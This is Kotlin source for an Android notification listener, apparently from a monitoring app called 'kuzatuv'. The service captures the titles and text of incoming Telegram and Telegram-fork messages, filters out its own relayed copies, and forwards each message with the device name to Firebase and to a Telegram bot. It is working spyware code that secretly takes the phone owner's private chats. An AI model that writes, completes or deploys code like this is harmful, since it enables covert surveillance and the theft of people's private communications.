package com.kuzatuv.app

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class TelegramNotificationListener : NotificationListenerService() {

    private val sentRecently = HashMap<String, Long>()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val pkgLower = pkg.lowercase()
        val isTelegramLike = pkgLower.contains("telegra") || pkgLower.contains("legram") || pkgLower.contains("nekogram") || pkgLower.contains("nekox")
        if (!isTelegramLike) return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        var text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

        val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        if (lines != null && lines.isNotEmpty()) {
            text = lines.joinToString("\n") { it.toString() }
        }

        val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
        if (messages != null && messages.isNotEmpty()) {
            val bundle = messages.last() as? Bundle
            val msgText = bundle?.getCharSequence("text")?.toString()
            if (!msgText.isNullOrEmpty()) text = msgText
        }

                        if (title.isEmpty() && text.isEmpty()) return
        if (title.contains("aniq_bot", ignoreCase = true)) return
        if (title.equals("Telegraph", ignoreCase = true)) return
        if (text.startsWith("📨")) return
        if (title.contains("aniq_bot", ignoreCase = true)) return
        if (text.startsWith("📨")) return

        val combined = "$title|$text"
        val now = System.currentTimeMillis()
        val lastTime = sentRecently[combined]
        if (lastTime != null && now - lastTime < 60000) return
        sentRecently[combined] = now

        val key = sbn.key
        val device = DevicePrefs.getDeviceName(applicationContext)
        FirebaseHelper.pushTelegram(key, title, text, now, device)
        TelegramHelper.send("📨 Telegram ($device)\n$title:\n$text")
    }
}
